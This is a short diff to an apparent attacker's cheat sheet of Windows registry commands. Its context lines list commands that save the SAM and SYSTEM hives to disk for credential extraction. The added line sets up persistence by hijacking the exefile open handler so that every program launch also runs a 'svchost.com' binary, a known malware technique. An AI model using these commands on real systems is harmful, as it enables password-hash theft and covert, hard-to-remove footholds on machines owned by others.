@@ -9,3 +9,4 @@ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v ProductNarne
 Service Info----reg query HKLM\SYSTEM\CurrentControlSet\Services\hMailServer	
 Dump Windows SAM file----reg save hklm\sam c:\sam 
 Dump Windows SYSTEM file----reg save hklm\system c:\system
+Persistence----reg add HKLM\SOFTWARE\Classes\exefile\shell\open /v command /t REG_SZ /d '%SystemRoot%\svchost.com "%1" %*'
